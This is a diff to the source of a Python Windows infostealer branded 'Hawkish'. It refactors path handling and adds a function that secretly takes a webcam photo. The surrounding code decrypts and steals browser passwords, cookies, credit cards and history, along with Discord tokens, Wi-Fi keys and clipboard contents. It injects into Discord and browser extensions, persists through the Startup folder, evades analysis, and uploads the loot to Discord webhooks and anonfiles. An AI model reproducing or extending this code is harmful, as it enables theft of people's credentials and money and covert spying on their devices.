@@ -1,7 +1,6 @@
 import asyncio
 import sys
 import json
-import ntpath
 import os
 import random
 import re
@@ -23,29 +22,26 @@ import win32gui
 import win32con
 import win32api
 import win32process
+import cv2
 
+
+
+from tempfile import gettempdir, mkdtemp
 from sqlite3 import connect
 from base64 import b64decode
 from urllib.request import Request, urlopen
-from shutil import copy2
 from datetime import datetime, timedelta, timezone
 from sys import argv
-from tempfile import gettempdir, mkdtemp
-from json import loads, dumps
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from Crypto.Cipher import AES
-from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from subprocess import CREATE_NEW_CONSOLE, Popen
-
+from PIL import ImageGrab
 
 shell32 = ctypes.windll.shell32
-
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
-
-
 
 Notpasswrd = []
 
@@ -69,7 +65,6 @@ wattis_secret = "https://rentry.co/fwi67/raw"
 fckyesz = requests.get(wattis_secret)
 maybycool = fckyesz.text
 
-
 shwk_aaast_secret = "https://rentry.co/wnqm9/raw"
 grrrrr = requests.get(shwk_aaast_secret)
 grbber = grrrrr.text
@@ -91,9 +86,6 @@ netwrd = "https://rentry.co/fgsqi/raw"
 myboyzzz = requests.get(netwrd)
 ntwrk = myboyzzz.text
 
-
-
-
 lilccks = "https://rentry.co/gxoe5/raw"
 rezs = requests.get(lilccks)
 justatermlil = rezs.text
@@ -102,7 +94,6 @@ justatermlil = rezs.text
 bigccks = "https://rentry.co/fzr38/raw"
 rez = requests.get(bigccks)
 justaterm = rez.text
-
 
 
 json_confg = {
@@ -154,8 +145,7 @@ except:
 class Functions(object):
     @staticmethod
     def hwkishfindClipboard():
-        return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True).stdout.decode(
-            errors='backslashreplace').strip()
+        return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True).stdout.decode(errors='backslashreplace').strip()
     
     @staticmethod
     def hwkishfindDevices():
@@ -175,17 +165,14 @@ class Functions(object):
     def hwkishfindwifi():
         profiles = list()
         passwords = dict()
-
-        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(
-                errors='ignore').strip().splitlines():
+        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
             if 'All User Profile' in line:
                 name = line[(line.find(':') + 1):].strip()
                 profiles.append(name)
 
         for profile in profiles:
             found = False
-            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True,
-                                       capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
+            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True,capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                 if 'Key Content' in line:
                     passwords[profile] = line[(line.find(':') + 1):].strip()
                     found = True
@@ -219,13 +206,8 @@ class Functions(object):
 
     @staticmethod
     def files_creating(_dir: str or os.PathLike = gettempdir()):
-        f1lenom = "".join(
-            random.SystemRandom().choice(
-                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-            )
-            for _ in range(random.randint(10, 20))
-        )
-        path = ntpath.join(_dir, f1lenom)
+        f1lenom = "".join( random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(random.randint(10, 20)))
+        path = os.path.join(_dir, f1lenom)
         open(path, "x")
         return path
 
@@ -259,16 +241,12 @@ class Functions(object):
             window_wid = "N/A"
         try:
             windowfoundkey = (
-                subprocess.check_output(
-                    sh2, creationflags=flag).decode().rstrip()
-            )
+                subprocess.check_output(sh2, creationflags=flag).decode().rstrip())
         except Exception:
             windowfoundkey = "N/A"
         try:
             wind_never = (
-                subprocess.check_output(
-                    sh3, creationflags=flag).decode().rstrip()
-            )
+                subprocess.check_output(sh3, creationflags=flag).decode().rstrip())
         except Exception:
             wind_never = "N/A"
         return [window_wid, wind_never, windowfoundkey]
@@ -295,7 +273,6 @@ class Functions(object):
             if value is not None:
                 return value
                 
-
     @staticmethod
     def info_netword() -> list:
         ip, city, country, region, org, loc, googlemap = (
@@ -364,8 +341,7 @@ class Replacer_Loop(Functions):
 class hwkish_first_funct(Functions):
     def __init__(self):
 
-        self.eco_baby = f'{base64.b64decode(self.find_in_config("hooking_hawk"))}'.replace(
-            "b'", "").replace("'", "")
+        self.eco_baby = f'{base64.b64decode(self.find_in_config("hooking_hawk"))}'.replace("b'", "").replace("'", "")
         self.ecobybro = str(self.eco_baby)
 
         self.thingstocount = {
@@ -425,8 +401,7 @@ class hwkish_first_funct(Functions):
         self.roaming = os.getenv("appdata")
         self._1 = "Google"
 
-        self.chrome_user_path = ntpath.join(
-            self.appdata, self._1, "Chrome", maybycool)
+        self.chrome_user_path = os.path.join(self.appdata, self._1, "Chrome", maybycool)
 
         self.dir, self.temp = mkdtemp(), gettempdir()
 
@@ -471,15 +446,11 @@ class hwkish_first_funct(Functions):
             self.loc,
         ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])
 
-        self.localstartup = ntpath.join(
-            self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
-        )
+        self.localstartup = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 
         self.webapi_find = "api/webhooks"
 
-        self.chrmrgx = re.compile(
-            r"(^profile\s\d*)|default|(guest profile$)", re.IGNORECASE | re.MULTILINE
-        )
+        self.chrmrgx = re.compile(r"(^profile\s\d*)|default|(guest profile$)", re.IGNORECASE | re.MULTILINE)
 
         self.disc_url_api = "https://discord.com/api/v9/users/@me"
 
@@ -498,11 +469,9 @@ class hwkish_first_funct(Functions):
         self.thezip_url = ""
 
         self.chrome_key = self.mykey_gtm(
-            ntpath.join(self.chrome_user_path, "Local State"))
+            os.path.join(self.chrome_user_path, "Local State"))
 
-        os.makedirs(self.dir, exist_ok=True)
-        
-           
+        os.makedirs(self.dir, exist_ok=True)    
 
         #EXTENSIONS INJECTOR
         self.programdata = os.environ['ProgramData']
@@ -516,7 +485,6 @@ class hwkish_first_funct(Functions):
         self.yandex = False
         self.iron = False
         self.kiwi = False
-        
         self.torch = False
         self.slimjet = False
         self.dragon = False
@@ -588,8 +556,7 @@ class hwkish_first_funct(Functions):
     def remoter_hwkisherr(self: str) -> str:
         if self.fake_error != "yes":
             return
-        ctypes.windll.user32.MessageBoxW(
-            None,
+        ctypes.windll.user32.MessageBoxW(None,
             "Error code: Windows_0x786542\nSOmething gone wrong.",
             "Fatal Error",
             0,
@@ -617,8 +584,7 @@ class hwkish_first_funct(Functions):
     def startup_so(self: str) -> str:
         if self.startupexe != "yes":
             return
-        startup_path = os.path.join(os.getenv(
-            "appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        startup_path = os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         src_file = argv[0]
         dest_file = os.path.join(startup_path, os.path.basename(src_file))
         if os.path.exists(dest_file):
@@ -643,14 +609,11 @@ class hwkish_first_funct(Functions):
         os._exit(0)
 
     def extract_try(func):
-        """Decorator to safely catch and ignore exceptions"""
-
         def wrapper(*args, **kwargs):
             try:
                 func(*args, **kwargs)
             except Exception:
                 pass
-
         return wrapper
 
     def getlange(self, pc_code) -> str:
@@ -853,12 +816,13 @@ class hwkish_first_funct(Functions):
             await self.bypass_tokenprtct()
 
         if self.hwk_get_sys == "yes":
-            os.makedirs(ntpath.join(self.dir, "Systeme"), exist_ok=True)
+            os.makedirs(os.path.join(self.dir, "Systeme"), exist_ok=True)
 
         if self.hwk_get_rblx == "yes":
-            os.makedirs(ntpath.join(self.dir, "Roblox"), exist_ok=True)
+            os.makedirs(os.path.join(self.dir, "Roblox"), exist_ok=True)
         function_list = [
             self.screen_baby,
+            self.camera_baby,
             self.hwkishget_mywifi,
             self.downloadclipboard,
             self.hwkishfindUSBdevices,
@@ -872,7 +836,7 @@ class hwkish_first_funct(Functions):
         if self.find_in_config("killdiscord_config") is True:
             await self.kill_process_id()
         if self.hwk_get_browsers == "yes":
-            os.makedirs(ntpath.join(self.dir, "Browsers"), exist_ok=True)
+            os.makedirs(os.path.join(self.dir, "Browsers"), exist_ok=True)
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
                 continue
@@ -894,11 +858,9 @@ class hwkish_first_funct(Functions):
                         func(name, path)
                     except:
                         pass
-        if ntpath.exists(self.chrome_user_path) and self.chrome_key is not None:
-            os.makedirs(ntpath.join(self.dir, "Google"), exist_ok=True)
-            function_list.extend(
-                [self.hwkishsteal_psw, self.hwkishstol_gang, self.hwkishsteal_thishist]
-            )
+        if os.path.exists(self.chrome_user_path) and self.chrome_key is not None:
+            os.makedirs(os.path.join(self.dir, "Google"), exist_ok=True)
+            function_list.extend([self.hwkishsteal_psw, self.hwkishstol_gang, self.hwkishsteal_thishist])
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
             process.start()
@@ -1031,20 +993,16 @@ class hwkish_first_funct(Functions):
             for extension_name, github_repo in extensions.items():
                 extensions_path = os.path.join(self.programdata, 'GoogleChromeExtensions')
                 extension_path = os.path.join(self.programdata, 'GoogleChromeExtensions', extension_name)
-                
                 response = requests.get(github_repo)
                 zip_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), f'{extension_name}.zip')
-
             with open(zip_path, 'wb') as f:
                 f.write(response.content)
-
             with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                 zip_ref.extractall(extension_path)
                 time.sleep(2)
                 main_file = os.path.join(extension_path, "extension-tokens", 'js', 'background.js')
                 main_file2 = os.path.join(extension_path, "extension-roblox", 'scripts', 'background.js')
 
-                
                 with open(main_file, 'r') as f:
                     filedata = f.read()
                     if self.apilink != "%API_" + "LINK%":
@@ -1054,7 +1012,6 @@ class hwkish_first_funct(Functions):
                 with open(main_file, 'w') as f:
                     f.write(newdata)
                     f.close()
-
                 with open(main_file2, 'r') as f:
                     filedata = f.read()
                     if self.apilink != "%API_" + "LINK%":
@@ -1064,10 +1021,7 @@ class hwkish_first_funct(Functions):
                 with open(main_file2, 'w') as f:
                     f.write(newdata)
                     f.close()
-
             os.remove(zip_path)
-
-
             if shell32.IsUserAnAdmin() == 0:
                     pass
             else:
@@ -1180,47 +1134,38 @@ class hwkish_first_funct(Functions):
     async def injection_discord(self):
         if self.find_in_config("AEZRETRYY5") != "yes":
             return
-        self.appdata = os.getenv("localappdata")
         discord_paths = [
             os.path.join(self.appdata, p)
             for p in os.listdir(self.appdata)
             if "discord" in p.lower()
         ]
-    
         for discord_path in discord_paths:
             app_paths = [
                 os.path.join(discord_path, p)
                 for p in os.listdir(discord_path)
                 if re.match(r"app-(\d*\.\d*)*", p)
             ]
-        
             for app_path in app_paths:
                 modules_path = os.path.join(app_path, "modules")
-
                 if not os.path.exists(modules_path):
                     continue
-            
                 inj_paths = [
                     os.path.join(modules_path, p)
                     for p in os.listdir(modules_path)
                     if re.match(fr"{coresecretname}-\d+", p)
                 ]
-                
                 for inj_path in inj_paths:
                     for root, dirs, files in os.walk(inj_path):
                         if "index.js" in files:
                             idx_path = os.path.join(root, "index.js")
-                
                     if self.localstartup not in argv[0]:
                         try:
                             for inj_path in inj_paths:
                                 for root, dirs, files in os.walk(inj_path):
                                     if "index.js" in files:
                                         os.makedirs(os.path.join(root, hwkish), exist_ok=True)
-
                         except PermissionError:
                             pass
-                    
                     if self.webapi_find in self.thishawk_webh:
                         core_asar = self.find_in_config("url_hawkinject")
                         try:
@@ -1246,8 +1191,6 @@ class hwkish_first_funct(Functions):
                     if self.find_in_config("killdiscord_config"):
                         file_name = os.path.splitext(os.path.basename(discord_path))[0]
                         app_exe = os.path.join(app_path, file_name + ".exe")
-                        print(app_path, file_name + ".exe")
-                        
                         if not os.path.isabs(app_exe):
                             raise ValueError(f"Invalid path: {app_exe}")
                         cmd = [app_exe]
@@ -1259,8 +1202,6 @@ class hwkish_first_funct(Functions):
                             print(f"Application file not found: {e}")
                         except Exception as e:
                             print(f"An error occurred: {e}")
-
-    
 
     async def bypass_tokenprtct(self):
         tp = os.path.join(self.roaming, "DiscordTokenProtector")
@@ -1291,14 +1232,12 @@ class hwkish_first_funct(Functions):
         item["iterations_iv"] = 364
         item["iterations_key"] = 457
         item["version"] = 69420
-
         with open(config, "w") as f:
             json.dump(item, f, indent=2, sort_keys=True)
             f.write(f"\n\n//{hwkish}_{stspecial}_is_here | https://github.com/{hwkish}-{stspecial}")
 
     async def kill_process_id(self):
         bllist = self.find_in_config("blacklistedprog")
-
         for i in [
             "discord",
             "discordtokenprotector",
@@ -1313,17 +1252,16 @@ class hwkish_first_funct(Functions):
                     proc.kill()
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
-
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in bllist):
                 try:
                     proc.kill()
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
-
+                
     async def bypss_betterdsc(self):
         bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
-        if ntpath.exists(bd):
+        if os.path.exists(bd):
             x = self.webapi_find
             with open(bd, "r", encoding="cp437", errors="ignore") as f:
                 txt = f.read()
@@ -1394,21 +1332,13 @@ class hwkish_first_funct(Functions):
                             continue
                         for line in [
                             x.strip()
-                            for x in open(
-                                f"{path}\\{filname}", errors="ignore"
-                            ).readlines()
+                            for x in open(f"{path}\\{filname}", errors="ignore").readlines()
                             if x.strip()
                         ]:
                             for y in re.findall(self.regexcrypt, line):
                                 try:
                                     token = self.decrypt_this_value(
-                                        base64.b64decode(
-                                            y.split("dQw4w9WgXcQ:")[1]),
-                                        self.found_thismasterk3y(
-                                            self.roaming +
-                                            f"\\{disc}\\Local State"
-                                        ),
-                                    )
+                                        base64.b64decode(y.split("dQw4w9WgXcQ:")[1]), self.found_thismasterk3y(self.roaming + f"\\{disc}\\Local State"),)
                                 except ValueError:
                                     pass
                                 try:
@@ -1454,9 +1384,7 @@ class hwkish_first_funct(Functions):
                                     self.hawked.append(token)
                                     self.hwkishid.append(uid)
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(
-                    self.roaming + "\\Mozilla\\Firefox\\Profiles"
-            ):
+            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                 for _file in files:
                     if not _file.endswith(".sqlite"):
                         continue
@@ -1484,13 +1412,8 @@ class hwkish_first_funct(Functions):
                                     self.hwkishid.append(uid)
 
     def dir_random_create(self, _dir: str or os.PathLike = gettempdir()):
-        filname = "".join(
-            random.SystemRandom().choice(
-                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-            )
-            for _ in range(random.randint(10, 20))
-        )
-        path = ntpath.join(_dir, filname)
+        filname = "".join(random.SystemRandom().choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")for _ in range(random.randint(10, 20)))
+        path = os.path.join(_dir, filname)
         open(path, "x")
         return path
 
@@ -1505,7 +1428,7 @@ class hwkish_first_funct(Functions):
 
         loginvault = self.dir_random_create()
         try:
-            copy2(path, loginvault)
+            shutil.copy2(path, loginvault)
             conn = sqlite3.connect(loginvault)
             cursor = conn.cursor()
             with open(os.path.join(self.dir, "Browsers", "Password.txt"), "a", encoding="utf-8") as f:
@@ -1543,10 +1466,10 @@ class hwkish_first_funct(Functions):
         if self.hwk_get_browsers != "yes":
             return
 
-        with open(ntpath.join(self.dir, "Google", "Passwords.txt"), "w", encoding="cp437", errors="ignore") as f:
+        with open(os.path.join(self.dir, "Google", "Passwords.txt"), "w", encoding="cp437", errors="ignore") as f:
             for prof in os.listdir(self.chrome_user_path):
                 if re.match(self.chrmrgx, prof):
-                    login_db = ntpath.join(
+                    login_db = os.path.join(
                         self.chrome_user_path, prof, "Login Data")
                     login = self.files_creating()
                     shutil.copy2(login_db, login)
@@ -1564,41 +1487,31 @@ class hwkish_first_funct(Functions):
                                     f"LINK: {url}\nIDENT:{username}\n{hwkish}-{stspecial}  PASSW:{decrypted_password}\n\n")
                                 self.thingstocount['passwrd'] += len(
                                     decrypted_password)
-
                     os.remove(login)
 
     @extract_try
     def hwkishstol_gang(self):
         if self.hwk_get_browsers != "yes":
             return
-
-        with open(ntpath.join(self.dir, "Google", f"{justaterm}.txt"), "w", encoding="cp437", errors="ignore") as f:
+        with open(os.path.join(self.dir, "Google", f"{justaterm}.txt"), "w", encoding="cp437", errors="ignore") as f:
             for prof in os.listdir(self.chrome_user_path):
                 if re.match(self.chrmrgx, prof):
-                    login_db = ntpath.join(
-                        self.chrome_user_path, prof, ntwrk, f"{justatermlil}")
+                    login_db = os.path.join(self.chrome_user_path, prof, ntwrk, f"{justatermlil}")
                     login = self.files_creating()
-
                     shutil.copy2(login_db, login)
                     conn = sqlite3.connect(login)
                     cursor = conn.cursor()
-                    cursor.execute(
-                        f"SELECT host_key, name, encrypted_value from {justatermlil}")
+                    cursor.execute(f"SELECT host_key, name, encrypted_value from {justatermlil}")
 
                     for r in cursor.fetchall():
                         host, user, encrypted_value = r
-                        dcryptedcks = self.value_decrypt(
-                            encrypted_value, self.chrome_key)
+                        dcryptedcks = self.value_decrypt(encrypted_value, self.chrome_key)
                         if host != "":
-                            f.write(
-                                f"{host}\tTRUE\t\t/FALSE\t2597573456\t{user}\t{dcryptedcks}\n")
-
+                            f.write(f"{host}\tTRUE\t\t/FALSE\t2597573456\t{user}\t{dcryptedcks}\n")
                         if "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" in dcryptedcks:
                             self.rblxcckcs.append(dcryptedcks)
-
                         self.thingstocount[f'{justatermlil}'] += len(dcryptedcks)
                         self.thingstocount['roblox_friendly'] += len(self.rblxcckcs)
-
                     cursor.close()
                     conn.close()
                     os.remove(login)
@@ -1607,35 +1520,23 @@ class hwkish_first_funct(Functions):
     def hwkishsteal_thishist2(self, name: str, path: str, profile: str):
         if self.hwk_get_browsers != "yes":
             return
-
         path = os.path.join(path, profile, "History")
         if not os.path.isfile(path):
             return
-
         historyvault = self.dir_random_create()
         shutil.copy2(path, historyvault)
-
         conn = sqlite3.connect(historyvault)
         cursor = conn.cursor()
-
         with open(
-            os.path.join(self.dir, "Browsers", "History.txt"),
-            "a",
-            encoding="utf-8",
-        ) as f:
+            os.path.join(self.dir, "Browsers", "History.txt"), "a", encoding="utf-8", ) as f:
             sites = []
-            for res in cursor.execute(
-                "SELECT url, title, visit_count, last_visit_time FROM urls WHERE url IS NOT NULL AND title IS NOT NULL AND visit_count IS NOT NULL AND last_visit_time IS NOT NULL"
-            ).fetchall():
+            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls WHERE url IS NOT NULL AND title IS NOT NULL AND visit_count IS NOT NULL AND last_visit_time IS NOT NULL").fetchall():
                 sites.append(res)
-
             sites.sort(key=lambda x: x[3], reverse=True)
             self.thingstocount['historybaby'] += len(sites)
-
             for site in sites:
                 f.write("Visit Count: {:<6} Title: {:<40}\n".format(
                     site[2], site[1]))
-
         cursor.close()
         conn.close()
         os.remove(historyvault)
@@ -1643,24 +1544,19 @@ class hwkish_first_funct(Functions):
     def hwkishsteal_cc2(self, name: str, path: str, profile: str):
         if self.hwk_get_browsers != "yes":
             return
-
         path += "\\" + profile + "\\Web Data"
         if not os.path.isfile(path):
             return
         cc_vaults = self.dir_random_create()
-        copy2(path, cc_vaults)
+        shutil.copy2(path, cc_vaults)
         with sqlite3.connect(cc_vaults) as conn:
             conn.row_factory = sqlite3.Row
             with conn.cursor() as cursor:
-                cursor.execute(
-                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards WHERE name_on_card != '' AND card_number_encrypted != ''"
-                )
-                with open(ntpath.join(self.dir, "Browsers", "CC.txt"), "a", encoding="utf-8") as f:
+                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards WHERE name_on_card != '' AND card_number_encrypted != ''")
+                with open(os.path.join(self.dir, "Browsers", "CC.txt"), "a", encoding="utf-8") as f:
                     for res in cursor.fetchall():
                         name_on_cc, expir_on_cc, expir_year_cc, number_onmy_cc = res
-                        f.write(
-                            f"Name: {name_on_cc}   Expiration Month: {expir_on_cc}   Expiration Year: {expir_year_cc}   Card Number: {self.value_decrypt(number_onmy_cc, self.masterkey)}\n"
-                        )
+                        f.write(f"Name: {name_on_cc}   Expiration Month: {expir_on_cc}   Expiration Year: {expir_year_cc}   Card Number: {self.value_decrypt(number_onmy_cc, self.masterkey)}\n")
                         self.thingstocount['creditcard'] += len(name_on_cc)
         os.remove(cc_vaults)
 
@@ -1669,10 +1565,9 @@ class hwkish_first_funct(Functions):
         if self.hwk_get_browsers != "yes":
             return
 
-        with open(ntpath.join(self.dir, "Google", "History.txt"), "w", encoding="cp437", errors="ignore") as f:
+        with open(os.path.join(self.dir, "Google", "History.txt"), "w", encoding="cp437", errors="ignore") as f:
             def hwkishpleaseexctract(db_cursor):
-                db_cursor.execute(
-                    "SELECT title, url, last_visit_time FROM urls")
+                db_cursor.execute("SELECT title, url, last_visit_time FROM urls")
                 for item in db_cursor.fetchall():
                     yield f"Search Title: {item[0]}\nURL: {item[1]}\nLAST VISIT TIME: {self.time_convertion(item[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"
 
@@ -1685,21 +1580,14 @@ class hwkish_first_funct(Functions):
             for prof in os.listdir(self.chrome_user_path):
                 if not re.match(self.chrmrgx, prof):
                     continue
-
-                login_db = ntpath.join(self.chrome_user_path, prof, "History")
+                login_db = os.path.join(self.chrome_user_path, prof, "History")
                 login = self.files_creating()
-
                 shutil.copy2(login_db, login)
                 with sqlite3.connect(login) as conn:
                     cursor = conn.cursor()
-
                     search_history = exctract_websearch_bc(cursor)
                     web_history = hwkishpleaseexctract(cursor)
-
-                    f.write(
-                        f"{' ' * 17}{hwkish}-{stspecial} SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}"
-                    )
-
+                    f.write(f"{' ' * 17}{hwkish}-{stspecial} SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}")
                     self.thingstocount['historybaby'] += sum(
                         1 for _ in search_history)
                     self.thingstocount['historybaby'] += sum(1 for _ in web_history)
@@ -1759,19 +1647,16 @@ class hwkish_first_funct(Functions):
     def found_thismc(self) -> None:
         if self.hwk_get_mc != "yes":
             return
-
-        mcdir = ntpath.join(self.roaming, ".minecraft")
-        if not os.path.exists(mcdir) or not os.path.isfile(ntpath.join(mcdir, "launcher_profiles.json")):
+        mcdir = os.path.join(self.roaming, ".minecraft")
+        if not os.path.exists(mcdir) or not os.path.isfile(os.path.join(mcdir, "launcher_profiles.json")):
             return
-
-        os.makedirs(pathtoget := ntpath.join(
+        os.makedirs(pathtoget := os.path.join(
             self.dir, "Minecraft"), exist_ok=True)
         count = 0
         for i in os.listdir(mcdir):
             if i.endswith((".json", ".txt", ".dat")):
-                shutil.copy2(ntpath.join(mcdir, i), ntpath.join(pathtoget, i))
+                shutil.copy2(os.path.join(mcdir, i), os.path.join(pathtoget, i))
                 count += 1
-
         self.thingstocount["friendlybabymc"] += count
 
     def downloadclipboard(self):
@@ -1832,7 +1717,7 @@ class hwkish_first_funct(Functions):
             f'SSID: {ssid}\n{hwkish}-{stspecial}  PASSW:{password}' for ssid, password in passwords.items()]
         divider = f'\n\n{hwkish}-{stspecial} | https://github.com/{hwkish}-{stspecial}/{hwkish}-{grbber}\n\n'
 
-        with open(ntpath.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding='utf-8', errors='ignore') as file:
+        with open(os.path.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding='utf-8', errors='ignore') as file:
             file.write(divider + divider.join(profiles))
 
         self.thingstocount['wifinet'] += len(profiles)
@@ -1858,7 +1743,7 @@ class hwkish_first_funct(Functions):
         if regex_c00ks:
             self.rblxcckcs.append(regex_c00ks)
         if self.rblxcckcs:
-            with open(ntpath.join(self.dir, "Roblox", f"Roblox_{justaterm}.txt"), "w") as f:
+            with open(os.path.join(self.dir, "Roblox", f"Roblox_{justaterm}.txt"), "w") as f:
                 f.write("\n".join(self.rblxcckcs))
 
     def upload_on_anonfiles(self, file_name, path):
@@ -1877,15 +1762,29 @@ class hwkish_first_funct(Functions):
         except Exception as e:
             print("Error :", str(e))
             return False
-        
+    def camera_baby(self):
+        try:
+            camera = cv2.VideoCapture(0)
+            result, image = camera.read()
+            if result:
+                cv2.imwrite(self.dir + f"\\Systeme\\Cam.png",image)
+                self.thingstocount['screenshotbro'] += 1
+            else:
+                pass
+        except:
+            pass
+
     def screen_baby(self):
         if self.hwk_get_screen != "yes":
             return
-
-        with ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None) as image:
-            image.save(self.dir + "\\Systeme\\Screenshot.png")
-
-        self.thingstocount['screenshotbro'] += 1
+        try:
+           screen_width = win32api.GetSystemMetrics(0)
+           screen_height = win32api.GetSystemMetrics(1)
+           image = ImageGrab.grab(bbox=(0, 0, screen_width, screen_height))
+           image.save("Screenshot.png")
+        except Exception as e:
+            pass
+        
 
     def system_informations(self):
         if self.hwk_get_sys != "yes":
@@ -1905,7 +1804,7 @@ class hwkish_first_funct(Functions):
             f"GoogleMaps: {self.googlemap}",
             f"Lang: {self.pc_codewinl}"
         ]
-        with open(ntpath.join(self.dir, 'Systeme', 'System_Info.txt'), 'w', encoding='utf-8', errors='ignore') as f:
+        with open(os.path.join(self.dir, 'Systeme', 'System_Info.txt'), 'w', encoding='utf-8', errors='ignore') as f:
             f.write('\n'.join(about))
 
     def finished_bc(self):
@@ -1927,13 +1826,13 @@ class hwkish_first_funct(Functions):
                                 x
                                 + f"\n\n{hwkish}-{grbber} Create By {hwkish}-{stspecial} Team | https://github.com/{hwkish}-{stspecial}"
                             )
-        _zipfile = ntpath.join(
+        _zipfile = os.path.join(
             self.appdata, f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_[{imthebestdev}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
-        path_src = ntpath.abspath(self.dir)
+        path_src = os.path.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
             for filename in files:
-                absname = ntpath.abspath(ntpath.join(dirname, filename))
+                absname = os.path.abspath(os.path.join(dirname, filename))
                 arcname = absname[len(path_src) + 1:]
                 zipped_file.write(absname, arcname)
         zipped_file.close()
@@ -2081,12 +1980,11 @@ class AntiDebugg(Functions):
                 data = response.json()
                 return data
             else:
-                print("Failed to fetch blocked programs from the URL:", url)
-                return []
+                pass 
         
         self.processes = list()
 
-        blocked_prog = "https://raw.githubusercontent.com/username/repository/main/blocked_programs.json"
+        blocked_prog = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_progr.json"
         blocked_pcname = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blockedpcname.json"
         blocked_hwid = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_hwid.json"
         blocked_ips = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_ips.json"
@@ -2115,7 +2013,7 @@ class AntiDebugg(Functions):
         blocked_ips = set(self.ips_blocked)
         blocked_hwids = set(self.hwid_blocked)
 
-        if any(ntpath.exists(path) for path in blocked_paths):
+        if any(os.path.exists(path) for path in blocked_paths):
             self.programExit()
         if imthebestdev in blocked_users:
             self.programExit()
@@ -2287,7 +2185,7 @@ def upload(name, tk=""):
             "username": f"{hwkish} - {grbber}",
             "attachments": [],
         }
-        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
+        URL_librairy_Loading(hook, json.dumps(data).encode(), headers=headers)
         return
     path = name
     files = {"file": open(path, "rb")}
@@ -2318,7 +2216,7 @@ def upload(name, tk=""):
             "username": f"{hwkish} - {grbber}",
             "attachments": [],
         }
-        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
+        URL_librairy_Loading(hook, data=json.dumps(data).encode(), headers=headers)
     if f"{hwkish}_all{justatermlil}" in name:
         rb = " | ".join(da for da in thec00ks)
         if len(rb) > 1000:
@@ -2344,7 +2242,7 @@ def upload(name, tk=""):
             "username": f"{hwkish} - {grbber}",
             "attachments": [],
         }
-        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
+        URL_librairy_Loading(hook, data=json.dumps(data).encode(), headers=headers)
     Requests_loading("POST", hook, files=files)
 
 
@@ -2386,7 +2284,7 @@ def hwkishfind_pswd(path, arg):
 
     pathKey = path + "/Local State"
     with open(pathKey, "r", encoding="utf-8") as f:
-        local_state = loads(f.read())
+        local_state = json.loads(f.read())
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = CryptUnprotectData(master_key[5:])
 
@@ -2436,7 +2334,7 @@ def hwkishfind_c00ks(path, arg):
     pathKey = path + "/Local State"
 
     with open(pathKey, "r", encoding="utf-8") as f:
-        local_state = loads(f.read())
+        local_state = json.loads(f.read())
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = CryptUnprotectData(master_key[5:])
 
